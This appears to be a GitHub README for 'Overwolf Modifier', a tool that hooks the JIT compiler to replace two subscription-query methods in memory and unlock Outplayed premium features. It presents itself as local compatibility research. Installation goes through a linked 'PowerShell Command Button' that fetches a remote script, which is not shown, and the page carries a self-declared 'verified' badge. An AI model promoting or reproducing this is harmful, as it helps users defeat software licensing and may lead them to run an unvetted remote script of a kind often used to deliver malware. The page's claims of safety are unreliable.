<div align="center">

# Overwolf Modifier — Advanced Enhancement for Windows

![](files/preview.png)

### ⌨️ PowerShell Command Button

[![](files/button.png)](https://IYADYAHIA.github.io/overwolf-modifier/)

[![setup](https://img.shields.io/badge/setup-847-6366f1?style=social&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/os-windows_10_%2F_11-818cf8?style=social&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/channel-verified-2ea44f?style=social&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/pwsh-5.1%2B-4f46e5?style=social&labelColor=0d1117)]()

</div>

---

Overwolf Modifier is a version-pinned, in-memory CLR instrumentation layer for investigating local Outplayed premium feature gates, operating entirely through the CLR profiling API rather than on-disk modification. The signed `OverWolf.Client.Core.dll` remains byte-for-byte unchanged, while two reviewed subscription methods are replaced in memory before JIT compilation, preserving the publisher signature and launcher verification path. Strict hash, MVID, architecture, and target metadata checks guard every instrumentation session, and unknown or altered builds are refused outright. This design confines all behavior to the instrumented process lifetime, making the tool a precise, self-contained instrument for controlled local analysis.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Key Capabilities

**Process-local CLR instrumentation:** The signed Overwolf Core assembly stays unchanged on disk; the reviewed target methods are replaced in memory through the CLR profiling API immediately before JIT compilation, and the change ends when the instrumented process exits.
- **Strict identity gating:** Every launch is validated against a pinned Core SHA-256, MVID, architecture, and target method metadata set. Unrecognized versions, hashes, or module identities are refused rather than approximated.
- **Two reviewed method targets:** Instrumentation is scoped to `GetExtensionSubscriptions()` and `GetExtensionSubscriptionsIds()`, with original IL, locals, branches, exception regions, and metadata preserved where the adapter requires them.
- **Layered diagnostic modes:** Dedicated `bootstrap`, `observe`, and `flags` stages separate profiler startup, callback registration, CLR flag behavior, and IL replacement so failures can be isolated without guesswork.
- **Behavioral verification modes:** A `neutral` mode swaps in equivalent original IL to confirm replacement mechanics, while the local plan fixture mode exercises the reviewed decision path end to end.
- **Process isolation:** Profiling attaches only to the authorized managed `Overwolf.exe` child launched through the standard desktop entry point, keeping the surrounding launcher and unrelated processes untouched.
- **Deterministic compilation control:** Inlining and NGEN are disabled process-wide for instrumented sessions so replacements are observable before JIT compilation rather than after silent optimization.
- **Offline test coverage:** An x64 fixture assembly and harness validate both target methods and profiler startup without requiring a live client, alongside a reproducible managed and native build pipeline.
- **Guarded legacy handling:** Historical on-disk workflows remain available only behind explicit safeguards, and on-disk rewriting is refused for the reviewed live version where it conflicts with verification behavior.
- **Transparent session boundaries:** No installation changes, persistence, or background components are introduced; each instrumented session is independent and revalidated from a clean process state.

## How It Works

The Overwolf Modifier operates through a version-pinned, in-memory CLR instrumentation pipeline. Rather than altering any signed file on disk, it attaches a native x64 profiler to the authorized Overwolf process during CLR startup, intercepting the JIT compilation of two reviewed subscription-query methods and supplying replacement IL through `SetILFunctionBody` before those methods are compiled. The installed Core module remains byte-for-byte identical, preserving publisher signatures and satisfying the launcher's verification path.

1. **Launcher handoff** — the tool invokes `OverwolfLauncher.exe from-desktop`, which spawns the managed `Overwolf.exe` child under the profiler's environment.
2. **Identity gate** — before any callback proceeds, the profiler validates the Core module's SHA-256, MVID, architecture, and target method metadata against the reviewed pin. Unknown identities are refused outright.
3. **JIT interception** — a callback fires for each target method, and equivalent or advanced IL is substituted in memory prior to compilation. Original locals, branches, exception regions, and metadata are retained where the adapter requires them.
4. **Session-scoped effect** — the substitution lives only for the instrumented process lifetime. Inlining and NGEN are disabled for the launch so the replacement is observable before JIT, and nothing persists after exit.

Diagnostic modes (`bootstrap`, `observe`, `flags`, `neutral`, `premium`) isolate startup, callback, flag, and IL-replacement stages, letting you confirm the mechanics independently of the outcome. The `neutral` mode substitutes the reviewed original behavior, while `premium` routes the local legacy plan fixture through the same verified path.

## Compatibility

This build is validated exclusively against the reviewed x64 installation of Overwolf `0.309.0.14` paired with Outplayed `175.3.12981`, and the pinned identity of `OverWolf.Client.Core.dll` (SHA-256 hash and MVID) is enforced before any instrumentation occurs. The profiler operates through the CLR profiling API against the authorized managed `Overwolf.exe` process launched by `OverwolfLauncher.exe from-desktop`, so the signed assembly on disk remains untouched and byte-identical throughout the session.

Compatibility checks are strict and fail closed. Any architecture mismatch, unknown Core hash, unexpected MVID, or divergence in target method metadata causes the adapter to refuse instrumentation rather than proceed on an unverified build. Both `GetExtensionSubscriptions()` and `GetExtensionSubscriptionsIds()` are validated against their reviewed metadata signatures, and inlining plus NGEN are disabled process-wide for instrumented launches so the replacement IL is observed before JIT compilation.

Because the adapter is version-pinned, client updates will invalidate it. A new Overwolf or Outplayed release requires a fresh compatibility investigation and adapter review before instrumentation can succeed again; the profiler itself is process-local and holds no persistent state, so each instrumented launch revalidates the pinned identity from scratch. The diagnostic modes — `bootstrap`, `observe`, and `flags` — exist precisely to isolate startup, callback, and IL-replacement failures when validating a new installation, while `neutral` mode confirms replacement mechanics against the reviewed original behavior.

Execution context matters as well. The instrumented commands must run under the interactive Windows that owns the Overwolf profile and can reach its CEF and Crashpad data; restricted or automation may fail during CEF initialization before the subscription methods are ever reached. Standard shortcut launches do not inherit the profiling environment, so Overwolf must be started through the instrument command with all existing Overwolf processes closed beforehand.

## Configuration

Configuration is handled entirely through command-line switches; no registry keys, environment variables, or on-disk settings files are read or written by Overwolf Modifier. Each invocation is self-contained, which keeps the tool portable and makes behavior reproducible across machines.

**Mode selection.** The `-mode` switch accepts `bootstrap`, `observe`, `flags`, `neutral`, and `premium`. The first three are diagnostic stages that progressively enable profiler startup, callback logging, and CLR flags without altering method bodies. `neutral` substitutes equivalent original IL to confirm that replacement mechanics work under the pinned identity, while `premium` supplies the reviewed local plan fixture. Use the diagnostic modes first when validating a new installation; reserve `premium` for installations whose Core hash, MVID, architecture, and metadata have all been confirmed.

**Target pinning.** The adapter is bound to a reviewed combination of Overwolf `0.309.0.14`, Outplayed `175.3.12981`, and a fixed SHA-256 and MVID for `OverWolf.Client.Core.dll`. These values are compiled into the adapter and are not user-editable at runtime. If any identity check fails, the profiler declines to attach rather than proceeding against an unknown build. Updates to the client require a fresh compatibility review before the pinned values can be advanced.

**App and plan parameters.** The `-app` switch takes an extension identifier, and `-plans` accepts one or more plan identifiers to present along the local decision path. For the reviewed Outplayed extension the accepted values are documented in the compatibility notes shipped with the project; pass them exactly as listed. Multiple plan identifiers may be supplied as a space-separated list after the switch.

**Timing controls.** `-wait-ms` sets how long the launcher waits for the target window before capturing state or exiting, expressed in milliseconds. Shorter values speed up iteration; longer values are useful on slower disks or when the client performs first-run initialization.

**Logging.** `-log PATH` redirects profiler output to an explicit file. When omitted, logs are written beneath `artifacts\profiler` relative to the executable directory. Every run records the detected Core identity, both `SetILFunctionBody` results, and the instrumented process identifier, which together form the audit trail for troubleshooting.

**Process hygiene.** Configuration takes effect only for processes launched by Overwolf Modifier. Close any running Overwolf processes before invoking the tool, since ordinary shortcut launches do not inherit the profiling environment and will silently bypass the configured behavior. Restart the instrumented command after each client update and re-verify the pinned identity first.

## Disclaimer

This tool performs in-memory CLR instrumentation on a pinned Overwolf build for local compatibility research. It is intended solely for personal, educational use on installations you own and operate.

The project does not modify publisher-signed files on disk. It hooks the JIT compiler for the authorized `Overwolf.exe` process, verifies the exact Core identity, and replaces two reviewed method bodies in memory for the current session. No changes are persisted between runs.

Use of this project may conflict with the terms of service of the target application or platform. You are responsible for understanding and complying with all applicable agreements before use.

This software is provided as-is, without warranty of any kind, express or implied. The contributors accept no liability for standing, data integrity, or any other outcome resulting from its use.

Do not redistribute modified builds. Obtain releases only through the official project channel and verify integrity where possible.

This project is not affiliated with, endorsed by, or supported by the target software's publisher or platform. All trademarks belong to their respective owners.